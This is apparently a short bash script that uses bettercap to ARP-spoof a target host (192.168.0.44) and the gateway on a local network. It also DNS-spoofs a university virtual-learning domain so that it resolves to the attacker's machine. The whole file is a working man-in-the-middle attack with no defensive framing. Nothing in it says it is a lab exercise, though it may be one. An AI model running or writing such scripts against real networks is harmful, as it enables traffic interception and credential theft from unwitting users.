#!/bin/bash
self=$(hostname -I | cut -c1-13)
dominio=ambientevirtul.nce.ufrj.br

#arpspoof -i eth0 -t $host -r 192.168.0.1
alvos=192.168.0.44

bettercap -iface eth0 -eval "set dns.spoof.domains $dominio;set dns.spoof.address $self;set dns.spoof.targets $alvos;dns.spoof on;set arp.spoof.targets $alvos,192.168.0.1;arp.spoof on;"
